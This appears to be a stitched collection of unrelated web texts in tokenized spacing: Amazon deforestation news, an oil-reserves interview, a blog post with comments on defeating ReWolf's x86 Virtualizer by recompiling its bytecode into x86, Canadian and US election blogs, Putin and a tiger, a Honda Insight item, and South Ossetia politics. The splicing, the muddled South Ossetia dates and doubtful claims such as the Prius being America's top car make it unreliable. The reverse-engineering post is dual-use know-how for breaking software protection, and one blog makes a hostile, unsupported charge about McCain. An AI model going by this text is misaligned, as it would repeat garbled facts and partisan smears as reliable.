News that total deforestation rose over the entire year came quickly after the announcement of monthly figures showing that month - on - month deforestation had in fact fallen .
Government figures show that between May and June this year deforestation fell by 25 % .
Despite the good news in recent months about the deforestation of the world 's largest tropical forest slowing , Minc admitted his country still faced huge challenges in order to stamp out illegal logging and described the levels of destruction as " alarming " .
" We ca n't celebrate [ the monthly drops ] because deforestation is [ still ] very large .
We have to invest everything into sustainable development , " Minc told the Folha de Sao Paulo newspaper .
Critics claimed that the annual statistics gave a more accurate picture of the destruction been wrought on the Brazilian jungle .
Environmental campaigners fear that Brazil 's push to expand its economy and develop the Amazon region is posing increasing threats to Brazil 's natural resources .
They accuse the government of retreating from its promises to defend the Amazon rainforest , which has been decimated since the 1970s by a mixture of logging , cattle ranching and soy farming .
" The president [ Luiz Inácio Lula da Silva ] said there would be no steps backwards , " the former environment minister Marina Silva said in an interview published yesterday in the O Globo newspaper .
" But suddenly there is a conjuncture of things that go against everything that was being done . "
Interview
Oil supplies will actually last for far longer than our politicians think , the scaremongers fear , and the oil companies tell us .
So says Dr Richard Pike , head of the Royal Society of Chemistry , and someone who is n’t afraid to stir controversy .
Whither , then , Peak Oil ?
In a wide - ranging interview , Dr Pike talked about energy independence , Peak Oil , and how to educate our scientifically illiterate elites .
Before becoming chief executive of the RCS , Pike spent twenty five years in the oil industry .
His background has n’t prevented him from calling for alternative energy sources to fossil fuels , and making criticisms that have embarrassed industry executives , latterly over the amount of oil lost to leakages .
But the most intriguing argument is that we ’re simply not told the truth about how long oil supplies will last .
Conventional wisdom reports the oil reserves as 1.2 trillion barrels .
There ’s far more than the oil companies report .
This is neither cock - up nor conspiracy , he says , but a combination of conservative reporting , a failure to understand probability theory , and consequently a lack of understanding of the figures actually mean .
Oil engineers and planners have their own – these are figures we do n’t see .
The figure quoted when oil companies declare their reserves is a “ P90 ” figure , which means an oil reserve has been discovered , the oil in it is recoverable , and the estimate has a 90 per cent chance of being exceeded .
This is always on the conservative side .
Another figure , the P50 estimate refers to “ proven but possible ” oil reserves , and is rarely quoted .
P50 can exceed P90 by a factor of two or three , and often reflects the output more accurately .
So why do n’t we hear P50 , rather than P90 ?
“ P90 is a lower bound , and companies have a duty to report what the lower bound is to statutory bodies , such as the Securities and Exchange Commission , and BERR in the UK , ” says Pike .
And that figure is conservative .
“ Over time , ‘ lower bound ’ has come to mean ‘ proven reserves ’ .
But it ’s actually the extreme left hand side of the probability curves . ”
Pike illustrates this with the example of throwing dice .
The oil man 's odds
“ If you add together the estimates of thousands of reserves , you ’re taking the lower bound each time .
Say you throw a dice :
The probability of throwing one is one in six .
With two dice , you ’ll be above one 97 per cent of the time .
With three , it ’s 99.4 per cent of the time .
So if you throw thousands of dice , the chances of you getting all ones are infinitesimally small .
But this is what oil companies are doing in their statutory reporting .
“ The statutory bodies will effectively say , ‘ We do n’t want some complicated probability analysis on what P90 is , just give us the straight simple number . ”
Then other bodies , such as the Peak Oil eschatologists ( “ the end of the world is nigh … ” ) , take the number and use it for something else .
Pike blames the compartmentalisation of the industry – engineers rarely make it to executive level and the people at the top never get to understand probabilistic analysis .
Inside the oil companies themselves , he points out , they ’ll often use the probabilistic approach – whether when estimating their own prospects , or eyeing up a rival in an M&A analysis .
So why do they do it , then ?

Printer Friendly ... Compiler 1 , X86 Virtualizer 0 Author : RolfRolles # Views : 23834
There are two types of virtual machine software protections : A ) the ones that convert x86 machine code into virtual machine bytecode and execute it at runtime ; B ) the ones that execute some arbitrary code in a virtual environment .
I 've discussed the latter several times in the past , and by now there exists a wealth of literature on that variety .
But breaking the former kind remains an unsolved problem .
In my article I said " basically , reverse engineering a VM with the common tools is like reverse engineering a scripted installer without a script decompiler : it 's repetitious , and the high - level details are obscured by the flood of low - level details " .
The more I thought about this , the more I realized that the word " basically " is out of place : virtualizing software protections are programming language interpreters , albeit for weird languages .
Consequently , an idea struck me : what we want here is not an interpreter , but a compiler to compile the bytecode back into x86 machine code .
I spent a week coding one ( ~1000 lines ) in OCaml to test this theory , and I 'm able to report that , indeed , it works .
I chose ReWolf's x86 Virtualizer , a simple target that uses some of the same techniques as the heavy hitters in this area .
Here is a walkthrough of the analysis and recompilation of a small function with one basic block .
The compiler works equally well for arbitrarily - large functions , although that would make this posting unnecessarily long and complicated .
Step - 2 : Protect something with the virtualizer .
In this case I just used ReWolf 's sample executable itself .
.text:00401896 call ds:GetTickCount
.text:0040189C push eax
.text:0040189D call _srand
.text:004018A2 pop ecx
.text:004018A3 push 0
.text:004018A5 push offset DialogFunc
.text:004018
AA push 0
.text:004018 AC push 65 h
.text:004018 AE push [ esp+10h+hInstance ]
.text:004018B2 call ds:DialogBoxParamA
.text:004018B8 xor eax , eax
.text:004018 BA retn 10 h
Step - 1 : Analyze the virtual machine .
Although this was not strictly necessary in this case because ReWolf provided source code , I decided to ignore it and reverse the VM manually , since you do n't always have such niceties .
Step 0 : Break the polymorphism in the instruction set .
I made use of two remarkably ghetto hacks here , one of which may be considered elegant .
To avoid provoking any arms races I 'll omit the details .
Step 1 : Disassemble the relevant region into VM bytecode .
In the process , construct a graph in which each vertex is an instruction , and the edges are the flows between them .
. VM:004131D0 db 0C2h , 0C9h , 0C0h , 0BDh , 14h , 0DFh , 63h , 9Ah , 86h , 5Eh , 50h , 30h , 0Bh
. VM:004131D0 db 0Ah , 0C0h , 0C7h , 0CEh , 5Eh , 44h , 0E1h , 0E0h , 0C7h , 0FCh , 0FDh , 12h
. VM:004131D0 db 10h , 50h , 0D8h , 0D2h , 0DBh , 0A6h , 3Dh , 34h , 0C9h , 12h , 0DEh , 0E5h , 4Bh
. VM:004131D0 db 2Ch , 2Eh , 6Eh , 23h , 21h , 27h , 0E2h , 0E5h , 0ECh , 99h , 14h , 13h , 0C2h
. VM:004131D0 db 0E5h , 0F9h , 0FDh , 0F4h , 38h , 14h , 0F7h , 0F0h , 0F9h , 0ABh , 79h , 6 , 0D7h
. VM:004131D0 db 0F0h , 8Bh , 88h , 81h , 41h , 87h , 8Ch , 85h , 0F8h , 51h , 9Ah , 26h , 0DFh
. VM:004131D0 db 0CFh , 1Eh , 15h , 75h , 76h , 74h , 6Bh , 98h , 9Dh , 94h , 6Eh , 0Ch , 6Bh , 90h

becomes
vertexlist =
[ {label = 84 ; instruction = VMExit 16l} ;
{label = 81 ; instruction = LiteralInstruction [ |51 ; 192 | ] } ;
{label = 69 ; instruction = ImagebaseFixupInstruction ( [ |255 ; 21 ; 72 ; 161 ; 0 ; 0| ] , 2l ) } ;
{label = 65 ; instruction = PushDereferencedTemp} ;
{label = 57 ; instruction = AddImmediateToTemp 20l} ;
{label = 52 ; instruction = AddRegisterToTemp Esp} ;
{label = 44 ; instruction = SetTemp 0l} ;
{label = 41 ; instruction = LiteralInstruction [ |106 ; 101 | ] } ;
{label = 38 ; instruction = LiteralInstruction [ |106 ; 0 | ] } ;
{label = 27 ; instruction = ImagebaseFixupInstruction ( [ |104 ; 240 ; 22 ; 0 ; 0| ] , 1l ) } ;
{label = 24 ; instruction = LiteralInstruction [ |106 ; 0 | ] } ;
{label = 22 ; instruction = LiteralInstruction [ |89 | ] } ;
{label = 14 ; instruction = X86 Call 6471l} ;
{label = 12 ; instruction = LiteralInstruction [ |80 | ] } ;
{label = 0 ; instruction = ImagebaseFixupInstruction ( [ |255 ; 21 ; 40 ; 160 ; 0 ; 0| ] , 2l ) } ] ;
edgelist =
[ ( {contents = {label = 0}} , {contents = {label = 12}} ) ;
( {contents = {label = 12}} , {contents = {label = 14}} ) ;
( {contents = {label = 14}} , {contents = {label = 22}} ) ;
( {contents = {label = 22}} , {contents = {label = 24}} ) ;
(* Lots and lots of edges removed *) ]
Step 2 : Form basic blocks within the instruction - level CFG .
The previous output becomes :
vertexlist =
[ {label = 0 ;
instruction =
[ |ImagebaseFixupInstruction ( [ |255 ; 21 ; 40 ; 160 ; 0 ; 0| ] , 2l ) ;
LiteralInstruction [ |80 | ] ;
X86Call 6471l ;
LiteralInstruction [ |89 | ] ;
LiteralInstruction [ |106 ; 0 | ] ;
ImagebaseFixupInstruction ( [ |104 ; 240 ; 22 ; 0 ; 0| ] , 1l ) ;
LiteralInstruction [ |106 ; 0 | ] ;
LiteralInstruction [ |106 ; 101 | ] ;
SetTemp 0l ;
AddRegisterToTemp Esp ;
AddImmediateToTemp 20l ;
PushDereferencedTemp ;
ImagebaseFixupInstruction ( [ |255 ; 21 ; 72 ; 161 ; 0 ; 0| ] , 2l ) ;
LiteralInstruction [ |51 ; 192| ] ; VMExit 16l | ] } ] ;
Step 3 : Optimize the code within the basic block .
The goal is to convert sequences of VM instructions into a new language more conducive to being compiled back into X86 .
The optimizer is the most powerful component of my compiler : it can remove obfuscation automatically simply as a side - effect of being an optimizer ( not that ReWolf 's has any , but others do ) , and employs no pattern matching .
vertexlist =
[ {label = 0 ;
instruction =
[ |ImagebaseFixupInstruction ( [ |255 ; 21 ; 40 ; 160 ; 0 ; 0| ] , 2l ) ;
LiteralInstruction [ |80 | ] ;
X86Call 6471l ;
LiteralInstruction [ |89 | ] ;
LiteralInstruction [ |106 ; 0 | ] ;
ImagebaseFixupInstruction ( [ |104 ; 240 ; 22 ; 0 ; 0| ] , 1l ) ;
LiteralInstruction [ |106 ; 0 | ] ;
LiteralInstruction [ |106 ; 101 | ] ;
SyntheticInstruction ( Push , Plus ( Constant 20l , Register Esp ) ) ;
ImagebaseFixupInstruction ( [ |255 ; 21 ; 72 ; 161 ; 0 ; 0| ] , 2l ) ;
LiteralInstruction [ |51 ; 192 | ] ;
VMExit 16l | ] } ] ;
Step 4 : Recompile all virtual instructions into x86 machine language .
vertexlist =
[ {label = 0 ;
instruction =
[ |ImagebaseFixupInstruction ( [ |255 ; 21 ; 40 ; 160 ; 0 ; 0| ] , 2l ) ;
LiteralInstruction [ |80 | ] ;
RelativeFixupInstruction ( [ |232 ; 0 ; 0 ; 0 ; 0| ] , 6471l , 1l ) ;
LiteralInstruction [ |89 | ] ;
LiteralInstruction [ |106 ; 0 | ] ;
ImagebaseFixupInstruction ( [ |104 ; 240 ; 22 ; 0 ; 0| ] , 1l ) ;
LiteralInstruction [ |106 ; 0 | ] ;
LiteralInstruction [ |106 ; 101 | ] ;
LiteralInstruction [ |255 ; 116 ; 36 ; 20 | ] ;
ImagebaseFixupInstruction ( [ |255 ; 21 ; 72 ; 161 ; 0 ; 0| ] , 2l ) ;
LiteralInstruction [ |51 ; 192 | ] ;
LiteralInstruction [ |194 ; 16 ; 0 | ] | ]} ] ;
Step 5 : Stuff the original bytes back into the binary and perform fixups specified .
If you can convert between hex and decimal in your head , you 'll notice that the bytes above correspond to those below , modulo fixups .
For multi- basic - block functions , this is harder , as you have to sequence the blocks and decide between short and long jumps .

. VM:004131F2 33 C0 xor eax , eax
. VM:004131F4 C2 10 00 retn 10h
Step 6 : Celebrate .
ReWolf 's X86 Virtualizer was simple , and surely breaking the harder ones is , well , harder , but I believe that the general principles espoused here should be applicable to the others .
I 'll have more to say about this in the future , including source code .

Impressive proof of concept there .
This could be an important step towards breaking todays virtualizing madness .

Reminds me a bit of Virus Bulletin 2003 's paper by Frédéric Perriot , " Defeating Polymorphism Through Code Optimization " on using optimization techniques to try to get a canonical representation of some obfuscared code .
He did not apply it to VMs tho .
Really good work Rolf , btw , how did you like OCaml ?
I 've only played briefly with it .
ReWolf Posted : Saturday , April 5 2008 16:47.27 CDT
my poor virtualizer ;d , anyway nice work :-) ( as always )
RolfRolles Posted : Saturday , April 5 2008 18:38.22 CDT
Thanks everybody !
It was a fun project , nicely timed too ( I needed to code something non-trivial in OCaml ) .
Ero : I 'd never seen this paper before , but it makes sense .
Certain obfuscations are " de- optimizations " , e.g. worthless instructions inserted into the stream = definitions with no uses , can be eliminated by dead code elimination ; e.g. using several instructions to produce a constant value = constant unfolding , can be eliminated by constant folding / propagation , etc .
Of course this does n't apply to all forms of obfuscation .
Regarding OCaml , the Windows OCaml interpreter needs work .
For one thing , it keeps leaving these zombie processes around ; I had to kill literally two dozen associated processes earlier today .
For another , if you paste in , say , 25 kb of code at one time , the interpreter will freeze .
So I have to copy and paste my VM compiler into the interpreter bit by bit which is annoying .
I suppose I should start working with the actual compiler , not the interpreter .
Regarding the language itself , I 'm still too green ( and not enough of a language maven ) to say anything really substantial about it , so I 'll let people smarter than me do the talking ; see here , and here 's a quote from Benjamin C. Pierce from " Types and Programming Languages " on which languages are good choices for static analysis :
" The most important requirements are automatic storage management ( garbage collection ) and easy facilities for defining recursive functions by pattern matching over structured data types .
Functional languages ... with pattern - matching ... are fine choices .
Languages with garbage collection but without pattern matching , such as Java ... are somewhat heavy for the sorts of programming we 'll be doing .
Languages with neither , such as C , are even less suitable . "

Wow man , you never cease to amaze .
RolfRolles Posted : Sunday , July 20 2008 23:40.59 CDT
By popular demand , the sparsely - commented , research - quality code .
I apologize for its excessive density .
Expect some details about applying the same concept towards breaking VMProtect .
Soul12 Posted : Thursday , July 24 2008 03:24.35 CDT
the biggist problem i see .. after re-reading a bit :) is being to setup rules for the VM - script .. i.e say the Opcode size is hardcoded into the Block which executes it .. i.e like in A certain protection .. where you dont know the size of the opcode before at the end of its execution .. so youd still have todo some tracing or byte scanning ... atleast to be able to automate the whole thing , or am i missing something rolf :)
zhangfeng79212 Posted : Friday , February 6 2009 04:30.17 CST could you share the source code ??
I want study from you !
thanks very much .
RolfRolles Posted : Friday , February 6 2009 15:59.22 CST
I must 've accidentally deleted the code at some point , so I 've re-uploaded it .
See three comments up for the link .

Remember Stockwell Day ?
The selection of Sarah Palin seemed eerily familiar to his nomination back in 2000 , and so far everything is going in exactly the same way it did in 2000 in Canada , except that it 's happening in a much shorter period of time in the US considering that it's now in the middle of the election campaign whereas in Canada he was chosen as leader before anyone knew an election was coming ( elections can be called at any time in Canada by the ruling party ) .
Now for the eerie similarities .
First there was the bravado of the first few months :
Apparently many Ontario Liberal
MPs are shaking in their boots in fear of losing their seats to Stockwell Day , the new leader - to - be of the Alliance Party .
These Ontario Liberal MPs are in the 905 and 705 belts around and north of the GTA and in the last federal election they just scraped through with narrow wins over their Reform Party opponents .
With the very articulate and dynamic right - wing Stockwell Day heading the Alliance Party , it could well be a different story .
There would go the slim Liberal majority .
Day is much like Texas Governor George W. Bush , whose slogan is " A Reformer with Results " .
Like Bush , Day has those results as treasurer of Alberta , the first province or government in Canada to balance its budget , and with the lowest taxes .
Day has come in with surpluses now for several budgets and has even introduced a much - needed and welcome flat tax in Alberta .
He offers the reform that Canada needs : lower federal taxes , less wasteful spending , and end to corrupt patronage and vote buying , a much tougher stance on crime , termination of the Young Offenders '
Act , more decentralization , a triple - E Senate , a reduction of the number of MPs and senators , a provincially appointed Supreme Court , and end to provincial transfer payments and crony capitalism , the restoration of Canada 's defense forces , reforms in education such as school vouchers and charter schools .
the termination of Big Labor 's special privileges etc .
The latest COMPAS poll shows the Canadian Alliance party of Stockwell Day at 26 % .
Although this looks weak beside the Chretien Liberals 45 % , it must still be worrisome for the Liberals , in that the election has not yet been called .
The CA seems to have the momentum .
Only ten points 42 % to 32 % separate Chretien and Day as Canadians choice for best leader .
With Chretien 's much wider exposure as PM , the campaign not yet underway and before any national televised debates , this is a very slim and precarious lead for Chretien .
Basically it was a " this new face on the national scene is going to shake things up after a successful run in provincial ( = state ) politics , watch out other party !
" Then a rise in the polls
Then learning more about the candidate and some unease over who this person might actually be :
> When asked about his stand on abortion in Kaleden in the interior
> this week by Linda Anderson , Stockwell Day made the following bold
> statement :
> " I am strongly pro-life , " he said , " and I would welcome any dis -
> cussion among MPs and constituents about the controversial issue ;
> including the sale of fetal tissue and the right of pro-life health
> care workers to refuse to participate in abortions .
Canadian Alliance Leader Stockwell
Day says he believes in the biblical version of how the Earth was created .
And he says public schools should be ``open '' to teaching creationism as well as evolution .
`` There is scientific support for both creationism and evolution , '' Day said yesterday in a written statement after first insisting his religious views are his own business .
Stockwell Day 's campaign started off on a bumpy note with the memorable geography gaffe about which way Niagara Falls flows .
Day compared the brain drain of qualified Canadians to the United States to the southern flow of the river .
The only problem was the river flowed north .
But that was n't the worst of it .
Throughout the campaign , issues such as abortion , gay rights and health care dogged the leader .
And allegations of racism , his negative platform , even Day 's personal beliefs have all created waves .
Despite this controversy , the Alliance leader came on strong at the debates and brought out big crowds along the campaign trail .
However , inexperience and a seasoned Liberal campaign team who knew how to play hardball caught the Alliance team off guard .
The Liberals managed to convince some Canadians that Day might have a " hidden agenda . "
As a result , Day was on the defensive almost everyday of the campaign which meant he was n't able to stick to his game plan of talking about issues .
Halifax —
The campaign to make Canadian Alliance Leader Stockwell Day change his first name to Doris has reached what organizers call the magic number .
More than 400,000 people have signed an Internet petition lobbying for the move , the CBC pollsters say .
Comedian Rick Mercer , of the satirical show This Hour has 22 Minutes , said Thursday that works out to 3 per cent of voters , the number the Alliance has suggested would be needed to trigger a national referendum .
But Mr. Mercer said he hears grumblings from Mr. Day 's people that the number might not be enough .
Mr. Mercer said that is no problem , he will get as many as it takes .
" The Alliance now believes this 3 per cent could be open to abuse , and we could n't agree more , so the ball is back in his court .
Just tell us the number and we 'll match it , " Mr. Mercer said .
" It 's actually useful now that they keep raising the bar , and I have every confidence that we can match it . "
The show launched the petition to lampoon the Alliance policy about holding referendums on issues if 3 per cent of voters petitioned for them .
Mr. Mercer said he wanted to show that " any idiot " could agitate for a referendum under the Alliance policy and said he wants to be the idiot to do it .
Why did MacCain select Stockwell Day ?
Even Harper knew enough to keep a superstitious bigot who belives that earth is only 6000 years old out of the limelight ..
And then a snap election for November , and then the gaffes began .
Oh , the gaffes that happened that election .
And finally , Doris Day So what happened ?
The Alliance Party only gained a few seats in the election of 2000 , the party split because a large number of members hated Day 's leadership , eventually he had to step down , the two conservative parties got a new leader , almost won the next election , won the won after that ( 2006 ) , and are now the Canadian government .
Stockwell Day is now the Minister of Public Safety , a safe low - level cabinet position that he probably will never rise above .
The big differences of course are the presence of McCain ( Stockwell Day was n't running for 2nd place ) and the fact that the GOP has been the ruling party for the past eight years whereas the Alliance was the opposition party , but besides this the Sarah Palin story so far is probably about as close to the Stockwell Day story as you can get .
And by the way , I 'm not the only one that has drawn this conclusion .
Two weeks or so ago right after noticing the eerie similarity between the two candidates I decided to see if there was any discussion on the matter so I did a quick search for Stockwell Day , and lo and behold
MOSCOW ( Reuters ) - Prime Minister Vladimir Putin was feted by Russian media on Sunday for saving a television crew from an attack by a Siberian tiger in the wilds of the Far East .
Slideshow ( 3 images )
Putin , taking a break from lambasting the West over Georgia , apparently saved the crew while on a trip to a national park to see how researchers monitor the tigers in the wild .
Just as Putin was arriving with a group of wildlife specialists to see a trapped Amur tiger , it escaped and ran towards a nearby camera crew , the country ’s main television station said .
Putin quickly shot the beast and sedated it with a tranquilizer gun .
“ Vladimir Putin not only managed to see the giant predator up close but also saved our television crew too , ” a presenter on Rossiya television said at the start of the main evening news .
The 55 - year - old former KGB spy , who cultivated a macho image during his eight years as the Kremlin chief , was shown striding through the taiga in camouflage and desert boots before grappling with the feline foe .
He helped measure the Amur tiger ’s incisors before placing a satellite transmitter around the neck of the beast , which can weigh up to 1,000 lb and measure around ten feet from nose to the tip of the tail .
The Amur tiger , the world ’s biggest wild cat , has recently pounced back from the brink of extinction to hit its highest population level for at least 100 years , the WWF said last year .
Putin thanked Western researchers for being involved in programs to save the Amur tigers .
“ First of all , we must thank our colleagues , Americans , European colleagues for being involved with this during a difficult time for Russia when no - one was paying any attention to this , ” Putin said .
Putin last year made it into glossy magazines across the world by donning combat trousers and baring his muscular torso for photographers while on a fishing trip in the Yenisei river .
Sensitive to a growing environmental movement in Russia , Putin as president redrew a planned oil pipeline route to avoid Lake Baikal and scrapped plans for an Olympic village near Sochi that could have damaged local flora and fauna .
Honda HQ ( TGW ) - Honda today unveiled the hybrid Insight , said it will be shown at the 2008 Paris Motor Show , and announced that it will only be sold as a hybrid .
The only car that is on sale currently only as a hybrid is the Toyota Prius .
The Insight will be a five seater , and Honda has introduced a host of new features to improve efficiency : the battery and control unit are located beneath the cargo space for exceptional utility and a light , a highly efficient compact hybrid powerplant , and a new driving support function .
Honda also claims ‘ significant ’ cost reductions .
The car will be introduced into the market in the spring of 2009 , and Honda expects to have annual global sales of 200,000 units .
The Prius , America ’s most popular car , sold 180,000 units in the U.S. alone last year .

Those are the exact people sitting on the bench , minus Kennedy , who voted in favor of the Lawrence v. Texas decision that banned sodomy laws .
He pretty much said that he wants to recriminalize homosexuality .
" This nomination should be based on the criteria on a proven record of strictly adhering to the Constitution and not legislating from the bench , " McCain added .
McCain said he would have never nominated Justices Ruth Bader Ginsburg , Stephen Breyer , David Souter and John Paul Stevens .
" I do n't think he was a strong enough jurist or a legal thinker at the time for that .
I profoundly disagree with his interpretation " of the Constitution , he said .
Neither candidate shied away from a question about which current Supreme Court justice they would not have nominated .
This deserves its own post separate from the one I wrote on Rick Warren 's presidential forum earlier .
No , he does n't say that in so many words , but that 's exactly what would happen :
There is n't much better code to speak in here .
The very fundies that he was speaking to at that forum were exactly the people who thought that Lawrence , along with Roe and Griswold , was an extreme case of judicial activism :
In 2003 , in Lawrence v. Texas , the court threw out all bans on sex acts between homosexuals , saying , according to Barron , " The right to privacy also included the right for same - sex couples to engage in same - sex sexual acts . "
And later in 2003 , when Massachusetts legalized same - sex marriage in Goodridge v. Department of Public Health , it cited Lawrence v. Texas as justification .
Sekulow sees these rights expounded in Goodridge and Lawrence going straight back to Griswold .
" If you see a decision out of the Supreme Court that says same - sex marriage is required -- if that were to happen , I think they will find it primarily ... originally ... in Griswold , and bring it forward , " Sekulow observed .
While it seems like the media does n't really want to catch this goal ( gay rights discourse is focused on marriage , and Lawrence seemed like a final decision to almost everyone ) , but McCain was talking to the exact audience that would want that case overturned , who agree with his reasoning , and he named almost every justice in that majority in his hit list .
Besides , whether he ever talks about wanting to reinstate sodomy laws or not , this is the most effective , direct , and , well , only way for sodomy laws to come back .
And he 's made it a central talking point when addressing fundamentalist audiences .
We should n't forget how easy it would be for that case to be overturned and to go back to the days when we were criminals just for loving .
Update :
This is also a major flip - flop :
McCain was n't a senator when Stevens was nominated , but why did he nevertheless vote to confirm Ginsburg , Breyer , and Souter ?
It seems he was for them before he was against them .
Will anyone pick up on this and ask him ?
Doubtful .
But even if he is flip - flopping here , I see no reason to doubt him .
He only cares about killing people and getting money , so it 's unlikely that he was lying here but that he 'll nominate decent human beings to the Supreme Court .
He 'll do whatever the Religious Right wants on judicial nominations because he just does n't care .
South Ossetia
South Ossetia has the status of a partially recognized republic , which proclaimed its independence from Georgia in December 1991 .
The legal status of the region as an independent republic is recognized by five states �
Russia , Venezuela , Nicaragua , Nauru and Tuvalu .
On April 9 , an estimated 33,000 - 40,000 voters went to the polls to vote fort the next president of the Republic of South Ossetia .
The vote marked the culmination of an acrimonious three - year standoff between incumbent President Leonid Tibilov , who was seeking a second term , and parliament speaker Anatoly Bibilov .
The two had long espoused different approaches to the time frame for possible incorporation of the region into the Russian Federation .
Tibilov , 65 , a former KGB head , was widely believed to enjoy the backing of Moscow , which bankrolls the region .
According to exit poll data , the incumbent head of state Leonid Tibilov gaining 45.8 % , its main competitor , the Speaker of Parliament , Anatoly Bibilov - 36.9 % .
Thus , according to the law , it must be assigned to the second round of elections .
A referendum was held on renaming the republic to the Republic of South Ossetia - the State of Alania .
Most of the citizens of South Ossetia voted in a referendum for the introduction of an equivalent name " State of Alania " , according to the exit poll , which was carried out of the South Ossetian autonomous non-commercial organization " sociological analysis of the Academy . "
The initiative was supported by 81.5 % of voters who took part in the vote , with against gaining only 18.5 % .
South Ossetia had a special status under Soviet rule as the South Ossetian Autonomous Oblast within the Georgian SSR .
Before 1989 there had been little inter-ethnic strife , but nationalism rose as the Soviet Union started to break - up .
South Ossetian nationalists demanded the status of autonomous republic , and declared the South Ossetian Democratic Republic in 1990 , fully sovereign within the USSR .
The nationalist Georgian government rejected this and violent conflict broke out in 1991 , resulting in over 100,000 displaced people and over 1000 dead .
In 1992 , Georgia accepted a ceasefire � and the presence of OSCE monitors .
Despite successive Georgian governments maintaining pressure on the Tskhinvali regime to reintegrate with Georgia and Russia�s determination to support the de facto South Ossetian government , the situation remained more or less stable , apart from an outbreak of fighting in summer 2004 , until the more serious events of August 2008 .
Since the war , the population of South Ossetia has been reduced to an estimated 35,000 .
Many ethnic Ossetians fled to North Ossetia ( part of the Russian Federation ) , and around 14,000 ethnic Georgians left for other parts of Georgia .
Some Ossetians have since returned to their homes , but the ethnic Georgians have not .
On 13 May 2009 , Greece ( chairing the OSCE in 2009 ) announced a suspension of the renewal of the mandate for the OSCE Mission in Georgia after months of blocking by Russia .
The mission was formally wound - up on 30 June .
A �parliamentary election� took place in South Ossetia in May 2009 .
Parties loyal to the incumbent �president � Eduard Kokoity gained the highest number of votes .
Two opposition parties were not allowed to participate because of concerns that they were not loyal to Kokoity .
The elections were illegal under Georgian law and the EU , US and NATO all issued statements to the same effect and rejecting the results .
February and April 2010 agreements between Moscow and the de facto Abkhaz and de facto South Ossetian authorities , respectively , establishing Russian military bases in the separatist regions for 49 years , are inconsistent with the terms of the August 12 cease - fire agreement negotiated by French President Sarkozy and signed by Georgian President Saakashvili and Russian President Medvedev .
The cease - fire agreement calls for the parties to : refrain from resorting to the use of force , ensure a definitive halt to hostilities , provide free humanitarian access to the separatist regions , withdraw forces to their pre-conflict positions , and open international discussions on security and stability in Abkhazia and South Ossetia .
A previous presidential poll was held in November 2011 , but the South Ossetia Supreme Court found it invalid after the candidate backed by Russia and the outgoing president lost and accused his opponent of campaign violations .
Kremlin - backed presidential candidate Anatoly Bibilov is now facing a run-off election , after unexpectedly failing to win a majority .
According to results published by the electoral commission , based on 99 percent of votes cast , Bibilov won 25.44 percent of votes , just ahead of former education minister Alla Dzhioyeva with 25.37 percent .
No other candidate polled more than 10 percent .
South Ossetia held a presidential run-off election 09 April 2012 , picking a former KGB chief supported by Russia .
A full vote count in Sunday 's run-off election showed Leonid Tibilov won with 54 percent of the vote .
Tibilov 's opponent , human rights ombudsman David Sanakoyev , won 42 percent .
About 35,000 people were registered to vote in the tiny province .
The EU , UN , and OSCE co-host ongoing Geneva - based talks on security and stability arrangements in the Abkhazia and South Ossetia regions .
The governments of Georgia , Russia , and the United States send representatives to participate in the talks , and de facto authorities from Abkhazia and South Ossetia also participate , as do representatives of the Abkhaz and South Ossetian governments - in - exile .
The talks have established Incident Prevention and Response Mechanisms ( IPRMs ) designed to foster stability on the ground , including on the administrative boundary lines and in the conflict areas .
Other items on the agenda include security , unfettered access to Abkhazia and South Ossetia for international monitors and human rights groups , and the return of internally displaced persons and refugees .
After a year of negotiations on the small print , in March 2017 Russian President Vladimir Putin gave his formal approval for the signing of an intergovernmental agreement on the modalities for the incorporation of " some military units " of Georgia 's breakaway Republic of South Ossetia into the Russian armed forces .
The agreement was one of a series of ancillary accords deriving from the framework Treaty on Union Relations and Integration between the Russian Federation and the Republic of South Ossetia ( RYuO ) signed in March 2015 .
It appeared that South Ossetia will retain a tiny army , given that President Putin told the Russian Defense Ministry it may make only any minor changes that may prove necessary prior to the official signing of the agreement .
Border Fence
Under an interstate agreement with Russia signed on April 30 , 2009 , South Ossetia delegated its state border protection functions to Russia until the republic establishes its own border guard service .
South Ossetia�s border with Georgia is about 210 miles ( 350 km ) long .
There have been intensified fencing efforts in 2013 by the Russian troops on the ground , installing wire fences across parts of the South Ossetian administrative border , which , the local villagers on the Georgian - controlled areas , say affects negatively on their daily life , hinders their free movement and agricultural activities .
The fences were reportedly installed a few hundred meters beyond that boundary , deeper inside Georgian territory .
Residents in the village of Ditsi bordering South Ossetia complain that they will not be able to use the land beyond the newly installed fences as pasture any more .
In late May 2013 , EU Monitoring Mission in Georgia ( EUMM ) condemned construction of barbed wire fences on the administrative border between Georgia and South Ossetia as unacceptable , and said it may destabilize the situation in the region .
Russia�s Foreign Ministry released a letter condemning what is said were attempts �to stoke up the situation� on the border between South Ossetia and Georgia with an eye to the election campaign in Georgia , and �shifting the blame� to Russia .
Georgian Prime Minister Bidzina Ivanishvili suggested 30 May 2013 that the flare - up over the installation of a fence was " misunderstanding rather than policy , " adding that " we have to be patient , everything will be clarified .
...
" With regards to what is going on at the borders , namely moving the barbed wire , we have made statements on that at different levels , " Ivanishvili said .
" Quite strict statements were made by various bodies , the Foreign Ministry being one of them .
I have a more moderate stance on this issue because I think that it is more about misunderstanding rather than the policy guided from the center , from the Kremlin , if you wish .
That �s my suspicion , although I have no evidence .
Let �s wait and see how things develop .
The minimum that was needed to be done on the government side is being done , including the discussion and statements in the parliament . "
NATO is concerned by the situation on the Georgia - South Ossetia border , where Russian forces put up wire fences along the border last week , NATO 's envoy for the South Caucasus and Central Asia James Appathurai said on 03 June 2013y .
Georgia protested over the setting up of barbed wire fence by Russian border forces along its border with the disputed region of South Ossetia .
The building of illegal dividing structures is a violation of existing agreements and impedes the free movement of people , Appathurai said .
Setting up wire fences along the South Ossetian - Georgia border is a totally unacceptable violation of international rights , NATO Secretary General Anders Fogh Rasmussen said 05 June 2013 .
� Building such fences is a violation of international law and of the 2008 agreements , � he told a closing press conference following the meetings of NATO defense ministers .
� Building fences impedes freedom of movement .
It can further inflame tensions , � he added .
� It is simply not acceptable , and we urge Russia to live up to her international obligations . �
According to the statement on 04 April 2016 of South Ossetian President Leonid Tibilov , the possibility of a referendum was discussed during his meeting with Russian President Vladimir Putin .
The referendum , which would allow the South Ossetian President to send Moscow an official request to join the Russian Federation , will be held in the near future , Tibilov said at a press conference .
" We discussed the issue with Russian President Vladimir Putin , and came to the conclusion that it is South Ossetia 's domestic issue .
This question needs legal framework and it is necessary to make amendments to the RSO constitution to implement it , " Tibilov said .
